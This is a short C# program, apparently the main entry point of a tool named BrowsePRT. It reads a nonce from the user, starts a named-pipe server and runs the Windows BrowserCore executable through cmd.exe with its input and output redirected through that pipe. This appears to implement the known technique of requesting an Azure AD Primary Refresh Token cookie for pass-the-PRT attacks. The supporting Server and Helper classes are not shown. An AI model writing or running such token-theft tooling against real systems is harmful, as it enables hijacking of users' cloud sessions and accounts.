using System.Diagnostics;
using BrowsePRT;


class Program
{
    static async Task Main(string[] args)
    {
        using (Process cmd = new Process())
        {
            System.Console.WriteLine("Enter nonce: ");
            string nonce = Console.ReadLine()
                ?? throw new InvalidOperationException("Nonce is required.");

            using (var srv = new Server(nonce))
            {
                Task serverTask = srv.StartAsync();

                cmd.StartInfo.FileName = "cmd.exe";
                cmd.StartInfo.Arguments = $"/d /c \"{Helper.GetBrowserCoreFilepath()}\" < \\\\.\\pipe\\{srv.PipeName} > \\\\.\\pipe\\{srv.PipeName}";
                cmd.StartInfo.UseShellExecute = false;
                cmd.Start();

                await serverTask;
                cmd.WaitForExit();
            }
        }
    }
}

